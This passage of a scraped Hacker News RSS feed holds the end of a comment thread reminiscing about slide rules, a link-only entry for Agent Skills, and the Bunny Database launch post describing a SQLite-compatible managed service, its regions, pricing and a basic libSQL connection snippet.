<div><p>My grandfather taught me, I have long since forgotten.  But I do recall that the killer use case was cube roots, which as opposed to multiplication or even square roots is difficult to do with pen and paper and much harder to mentally estimate.</p></div></td></tr></tbody></table></td></tr><tr id="46872596"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872596" href="https://news.ycombinator.com/vote?id=46872596&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I worked at a countertop shop and used a sliding rule a bit. But I also used a sticky paper with marks to get measurements off my screen. A lot of blueprints provide no dimensions for cabinets and desks.</p><p>Countertops is an industry with all the modern tools but 5000yo approach.</p></div></td></tr></tbody></table></td></tr><tr id="46871301"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871301" href="https://news.ycombinator.com/vote?id=46871301&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Naw. I used to, but it's so long ago, I'm not sure I could do it now if you put one in front of me. What you don't use atrophies.</p></div></td></tr></tbody></table></td></tr><tr id="46871956"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871956" href="https://news.ycombinator.com/vote?id=46871956&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I have half a dozen of them (including my father's from college) that I cherish, but do not use. I love the simplicity and elegance of the design. (Slide rules do a lot with operations that essentially boil down to addition, subtraction, and looking up function values in tables.)</p></div></td></tr></tbody></table></td></tr><tr id="46873703"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46873703" href="https://news.ycombinator.com/vote?id=46873703&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>My grandfather taught me the basics of using it and I still have his, but haven’t used it in decades and need a refresher.</p></div></td></tr></tbody></table></td></tr><tr id="46872220"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872220" href="https://news.ycombinator.com/vote?id=46872220&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Yes, but just as a ruler. It belonged to my Dad who was an avionics engineer starting back in the 1950s. He worked all over the world seeing out the end of the British Empire. It smells of old cigarettes and is very worn and chipped.</p></div></td></tr></tbody></table></td></tr><tr id="46871897"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871897" href="https://news.ycombinator.com/vote?id=46871897&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I've acquired one for curiosity (a relative used to teach engineering, he was thrilled I wanted one, gave me his own)</p><p>I used it a few times, it works, of course, ... but it's not fast and not precise so I don't think anybody would use it to be productive in 2026</p><p>It sits in a box</p></div></td></tr></tbody></table></td></tr><tr id="46873135"><td></td></tr><tr id="46872739"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872739" href="https://news.ycombinator.com/vote?id=46872739&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I don't use it, but if you are interested in math, it's a nice device to take a look and try to understand, at least for the basic operations.</p></div></td></tr></tbody></table></td></tr><tr id="46872737"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872737" href="https://news.ycombinator.com/vote?id=46872737&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I had to learn how to use a circular slide rule for my pilot school (CRP-5). Easily top 5 exciting pieces of technology I had the opportunity to use</p></div></td></tr></tbody></table></td></tr><tr id="46872277"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872277" href="https://news.ycombinator.com/vote?id=46872277&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I built my own slide rule in school for fun! It looked pretty cool to me at the time. The template is still out there if you search something like "paper slide rule".</p></div></td></tr></tbody></table></td></tr><tr id="46872613"><td></td></tr><tr id="46871870"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871870" href="https://news.ycombinator.com/vote?id=46871870&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I bought one a few months ago off of ebay after I realized how important logarithms are in many different domains (including machine learning &amp; information theory)</p></div></td></tr></tbody></table></td></tr><tr id="46871403"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46871403" href="https://news.ycombinator.com/vote?id=46871403&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Knew a mechanical engineer at a place where I interned. Asked him about it and he joked that he didn't trust those transistors before explaining that it's just muscle memory to him and while a calculator would be faster he'd still earn the same per hour. Apparently I was the first to ask him in over a decade as everyone had moved on to do stuff in software and no one was pushing him to use a calculator anymore. Interns didn't inquire because they thought it must be some esoteric/religious practice. Last I heard he was still working there, management asked him to stay on past retirement age for his invaluable skillset. While its probably some other skill I just like to imagine the suits in a meeting where they decided to keep him on for this particular "skill" that no one else in the company had anymore.</p></div></td></tr></tbody></table></td></tr><tr id="46871427"><td></td></tr><tr id="46873114"><td></td></tr><tr id="46871312"><td></td></tr><tr id="46871681"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46871681" href="https://news.ycombinator.com/vote?id=46871681&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I feel like it's actually a little faster than a digital computer.  I don't have a lot of experience yet, though.</p></div></td></tr></tbody></table></td></tr><tr id="46872251"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872251" href="https://news.ycombinator.com/vote?id=46872251&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>I was not allowed to use a calculator in my high school calculus class but I <i>was</i> permitted to (and did) use a slide rule.</p></div></td></tr></tbody></table></td></tr><tr id="46872941"><td></td></tr><tr id="46872265"><td></td></tr><tr id="46871430"><td></td></tr><tr id="46872452"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46872452" href="https://news.ycombinator.com/vote?id=46872452&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Obligatory Asimov quote:</p><p>"The Analytical Rule might be considered a distant relation – as a skyscraper is to a shack – of that kindergarten toy, the logarithmic Slide Rule. Darell used it with the wristflip of long practice. He made freehand drawings of the result and, as Anthor stated, there were featureless plateaus in frontal lobe regions where strong swings should have been expected."</p><p>I'd really love an Analytical Rule, this hoverboard of the early atomic era.</p></div></td></tr></tbody></table></td></tr><tr id="46872307"><td></td></tr><tr id="46873838"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46873838" href="https://news.ycombinator.com/vote?id=46873838&amp;how=up&amp;goto=item%3Fid%3D46871179"></a></center></td><td><br>
<div><p>Knowing how they work can be useful when imagining machinations of an algorithm and if the code is really necessary to do all the steps that way. :)</p></div></td></tr></tbody></table></td></tr><tr id="46871609"><td></td></tr><tr id="46871414"><td></td></tr></tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Agent Skills (437 pts)]]></title>
            <link>https://agentskills.io/home</link>
            <guid>46871173</guid>
            <pubDate>Tue, 03 Feb 2026 14:09:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://agentskills.io/home">https://agentskills.io/home</a>, See on <a href="https://news.ycombinator.com/item?id=46871173">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Bunny Database (270 pts)]]></title>
            <link>https://bunny.net/blog/meet-bunny-database-the-sql-service-that-just-works/</link>
            <guid>46870015</guid>
            <pubDate>Tue, 03 Feb 2026 12:13:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bunny.net/blog/meet-bunny-database-the-sql-service-that-just-works/">https://bunny.net/blog/meet-bunny-database-the-sql-service-that-just-works/</a>, See on <a href="https://news.ycombinator.com/item?id=46870015">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Don’t want to babysit your app database on a VM but not willing to pay the DBaaS tax either? We're building a third way.</p><p>Today, we’re launching Bunny Database as a public preview: a SQLite-compatible managed service that spins down when idle, keeps latency low wherever your users are, and doesn’t cost a fortune.</p><h2 id="so-what%E2%80%99s-the-deal-with-database-services-in-2026">So what’s the deal with database services in 2026?</h2><p>It’s become clear by now that the DBaaS platforms that garnered the love of so many devs are all going upmarket. Removing or dumbing down free tiers, charging for unused capacity, charging extra for small features, or bundling them in higher tiers — you already know the drill.</p><p>Hard to blame anyone for growing their business, but it doesn’t feel right when these services stop making sense for the very people who helped popularize them in the first place.</p><p>So where does that leave you?</p><h2 id="like-sqlite-but-for-the-web">Like SQLite, but for the web</h2><p>Not every project needs Postgres, and that’s okay. Sometimes you just want a simple, reliable database that you can spin up quickly and build on, without worrying it’ll hit your wallet like an EC2.</p><p>That’s what we built Bunny Database for.</p><p>What you get:</p><ul><li><strong>One-click deployment</strong>: just name your database and go, no config needed</li><li><strong>Language-specific tooling</strong>: SDKs for TS/JS, Go, Rust, and .NET help you handle the boring bits</li><li><strong>Low latency anywhere</strong>: replication regions let you serve reads close to your users</li><li><strong>41 regions worldwide</strong>: choose between automatic, single-region, and multi-region deployment</li><li><strong>Works over HTTP</strong>: wire up anything you’d like</li><li><strong>Database editor</strong>: insert data or run queries on the spot</li><li><strong>Metrics</strong>: instant visibility into reads, writes, storage, and latency</li><li><strong>Affordable, pay-as-you-go pricing</strong>: only pay for what you use, but without the serverless tax</li></ul><p>Get the full tour including how to connect Bunny Database to your app in this quick demo from our DX Engineer, Jamie Barton:</p>
<!--kg-card-begin: html-->

<!--kg-card-end: html-->
<h2 id="why-care-about-database-latency-anyway">Why care about database latency anyway?</h2><p>You probably optimize the heck out of your frontend, APIs, and caching layers, all for the sake of delivering an experience that feels instant to your users. But when your database is far away from them, round-trip time starts to add noticeable latency.</p><p>The usual fix is to introduce more caching layers, denormalized reads, or other workarounds. That’s obviously no fun.</p><p>And when you think about it, devs end up doing this because the popular DBaaS platforms are usually either limited, complex, or too costly when it comes to multi-region deployments. So what looks like a caching problem is actually a data locality issue.</p><p>OK, but how bad can it really be?</p><p>To find out, we ran a read latency benchmark and measured p95 latency in Bunny Database.</p><p>We picked a number of regions across the world and compared round-trip time for client locations ever farther away from the database in:</p><ul><li>a single-region setup,</li><li>with replication regions enabled.</li></ul><p>Turns out serving reads close to clients reduced latency by up to 99%.</p><p>Check out the full write-up on the benchmark setup and results <a href="https://bunny.net/blog/how-database-location-affects-far-away-users-benchmarking-read-latency-in-bunny-database/">here</a>.</p><figure><img src="https://bunny.net/blog/content/images/2026/01/Bunny-Database-Latency-Graph.webp" alt="" loading="lazy" width="1330" height="986" srcset="https://bunny.net/blog/content/images/size/w600/2026/01/Bunny-Database-Latency-Graph.webp 600w, https://bunny.net/blog/content/images/size/w1000/2026/01/Bunny-Database-Latency-Graph.webp 1000w, https://bunny.net/blog/content/images/2026/01/Bunny-Database-Latency-Graph.webp 1330w" sizes="(min-width: 720px) 720px"></figure><p>While this definitely matters most to apps with global users, data locality does apply to everyone. With Bunny Database, you don’t have to stick to major data center locations and compensate with caching workarounds any more. Instead, you get a lot of flexibility to set up regions in an intuitive interface and it’s easy to switch things up as your requirements change.</p><p>Choose between 3 deployment types when creating a database:</p><ul><li><strong>Automatic region selection</strong> gives you one-click deployment with minimal latency. Bunny Database will select regions for you based on your IP address (you can check and tweak the selection in settings later).</li><li><strong>Single-region deployment</strong> lets you pick one of 41 regions available worldwide (check the full list <a href="https://docs.bunny.net/magic-containers/regions" rel="noopener noreferrer">here</a>).</li><li><strong>Manual region selection</strong> gives you custom multi-region setup, where you can freely pick regions that make the most sense for your audience.</li></ul><figure><img src="https://bunny.net/blog/content/images/2026/01/Bunny-Database-regions.webp" alt="" loading="lazy" width="1524" height="1328" srcset="https://bunny.net/blog/content/images/size/w600/2026/01/Bunny-Database-regions.webp 600w, https://bunny.net/blog/content/images/size/w1000/2026/01/Bunny-Database-regions.webp 1000w, https://bunny.net/blog/content/images/2026/01/Bunny-Database-regions.webp 1524w" sizes="(min-width: 720px) 720px"></figure><p>All of this lets you start wherever you’d like and add regions as needed, without re-architecting your app.</p><h2 id="usage-based-pricing-but-without-the-serverless-tax">Usage-based pricing, but without the serverless tax</h2><p>In the database world, capacity-based pricing gives you some predictability. But no one likes to pay for unused capacity, right?</p><p>Serverless, on the other hand, is supposed to be cost-efficient, yet can rack up bills quickly, especially when the DBaaS charges significant markups on top of already pricey compute.</p><p>We don’t do hyperscalers, though, so we can charge a fair price for Bunny Database in a usage-based model.</p><ul><li>Reads: <strong>$0.30 per billion rows</strong></li><li>Writes: <strong>$0.30 per million rows</strong></li><li>Storage: <strong>$0.10 per GB per active region</strong> (monthly)</li><li>When not getting requests, Bunny Database only incurs storage costs. One primary region is charged continuously, while read replicas only add storage costs when serving traffic (metered by the hour)</li><li>Your usage is charged continuously (pay-as-you-go) and invoiced monthly</li></ul><p>During the public preview phase, Bunny Database is free.</p><h2 id="wait-what-does-%E2%80%9Csqlite-compatible%E2%80%9D-actually-mean">Wait, what does “SQLite-compatible” actually mean?</h2><p>Bunny Database wouldn’t be possible without libSQL, the open-source, open-contribution fork of SQLite created by Turso.</p><p>We run Bunny Database on our own fork of libSQL, which gives us the freedom to integrate it tightly with the bunny.net platform and handle the infrastructure and orchestration needed to run it as a managed, multi-region service.</p><p>What does this mean for Bunny Database’s upstream feature parity with libSQL and SQLite, respectively?</p><p>The short answer is that we don’t currently promise automatic or complete feature parity with either upstream libSQL or the latest SQLite releases.</p><p>While libSQL aims to stay compatible with SQLite’s API and file format, it doesn’t move in lockstep with upstream SQLite. We wouldn’t expect otherwise, especially as Turso has shifted focus from libSQL toward a long-term rewrite of SQLite in Rust.</p><p>For Bunny Database, this means that compatibility today is defined by the libSQL version we’re built on, rather than by chasing every upstream SQLite or libSQL change as it lands. We haven’t pulled in any upstream changes yet, and we don’t currently treat upstream parity as an automatic goal.</p><p>That’s intentional. Our focus so far has been on making Bunny Database reliable and easy to operate as a service. We think bringing in upstream changes only makes sense when they clearly improve real-world use cases, not just to tick a parity checkbox.</p><p>If there are specific libSQL features you’d like to see exposed in Bunny Database, or recent SQLite features you’d want us to pull in, we’d love to hear about it. <a href="https://discord.com/invite/bunnynet" rel="noopener noreferrer">Join our Discord</a> to discuss your use cases and help shape the roadmap!</p><h2 id="what%E2%80%99s-ahead-for-bunny-database">What’s ahead for Bunny Database</h2><p>Speaking of the roadmap, we don’t stop cooking. Here’s what’s coming up next:</p><ul><li>Automatic backups</li><li>Database file import/export</li><li>Auto-generated, schema-aware API with type-safe SDKs</li></ul><p>There’s even more to come, but it’s too soon to spill the beans yet, especially while we’re in public preview. We’d love to hear your feedback, so we can shape what ships next together.</p><p>Bunny Database works standalone and fits right into your stack via the SDKs (or you can hook up anything using the HTTP API). But it also plays nicely with <a href="https://docs.bunny.net/docs/edge-scripting-overview">Bunny Edge Scripting</a> and <a href="https://docs.bunny.net/docs/magic-containers-overview">Bunny Magic Containers</a>.</p><p>To connect your database to an Edge Script or a Magic Containers app, simply go to the Access tab of the chosen database and click <strong>Generate Tokens</strong> to create new access credentials for it.</p><p>Once they’re generated, you’ll get two paths to choose from:</p><ul><li><strong>Click Add Secrets to an Edge Script</strong> and select the one you’d like to connect from the list. You’ll also need to import the libSQL TypeScript client and use the provided code snippet to connect it to your database.</li><li><strong>Click Add Secrets to Magic Container App</strong> and select the one you’d like to connect from the list. You’ll also need to connect to the database from your app using one of the client libraries or the HTTP API.</li></ul><p>After you complete the setup, the database URL and access token will be available as environment variables in your script or app. Use them to connect to your database:</p>
<!--kg-card-begin: html-->
<div>

  <p><code>import</code> 
  <code>{</code> 
  <code>createClient</code> 
  <code>}</code> 
  <code>from</code> 
  <code>"@libsql/client/web"</code><code>;</code></p><p>

  <code>const</code> 
  <code>client</code> 
  <code>=</code> 
  <code>createClient</code><code>({</code><br>
  &nbsp;&nbsp;<code>url</code><code>:</code> 
  <code>process.env.</code><code>DB_URL</code><code>,</code><br>
  &nbsp;&nbsp;<code>authToken</code><code>:</code> 
  <code>process.env.</code><code>DB_TOKEN</code><br>
  <code>});</code></p><p>

  <code>const</code> 
  <code>result</code> 
  <code>=</code> 
  <code>client</code><code>.</code><code>execute</code><code>(</code><code>"SELECT * FROM users"</code><code>);</code></p></div>

<!--kg-card-end: html-->
<p>You can find more detailed, step-by-step integration instructions in the docs:</p><ul><li><a href="https://docs.bunny.net/database/connect/scripting" rel="noopener noreferrer">Connecting an Edge Script to Bunny Database</a></li><li><a href="https://docs.bunny.net/database/connect/magic-containers" rel="noopener noreferrer">Connecting a Magic Containers app to Bunny Database</a></li></ul><h2 id="hop-on-board">Hop on board</h2><p>We can’t wait to see what you’ll build with Bunny Database and what you think of it. During the public preview phase, you get 50 databases per user account, each capped at 1 GB, but we hope this should be more than enough for lots of fun projects.</p><p>Just sign in to the bunny.net dashboard to get started. Happy building!</p></div></div>]]></description>
        </item>
    </channel>
</rss>